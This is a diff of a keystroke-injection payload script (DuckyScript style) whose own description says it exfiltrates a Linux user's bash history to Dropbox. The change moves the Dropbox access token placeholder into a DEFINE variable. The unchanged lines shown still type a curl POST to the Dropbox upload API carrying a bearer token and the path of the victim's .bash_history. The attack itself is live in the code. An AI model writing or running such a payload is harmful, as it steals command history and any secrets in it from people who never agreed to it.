@@ -3,6 +3,9 @@ REM Author: Zoe Ronen
 REM Description: This payload is meant to exfiltrate bash history to a dropbox
 REM Target: Linux/Xfce4
 
+REM replace the [DROPBOX_ACCESS_TOKEN] placeholder with your actual Dropbox access token
+DEFINE #API_TOKEN [DROPBOX_ACCESS_TOKEN]
+
 DELAY 500
 ALT-F2
 DELAY 500
@@ -16,8 +19,7 @@ ENTER
 DELAY 500
 STRING curl -X POST https://content.dropboxapi.com/2/files/upload
 SPACE
-REM replace the [DROPBOX_ACCESS_TOKEN] placeholder with your actual Dropbox access token
-STRING --header "Authorization: Bearer [DROPBOX_ACCESS_TOKEN]"
+STRING --header "Authorization: Bearer #API_TOKEN"
 SPACE
 STRING --header "Dropbox-API-Arg: {\"path\": \"/home/$USER/.bash_history\"}"
 SPACE
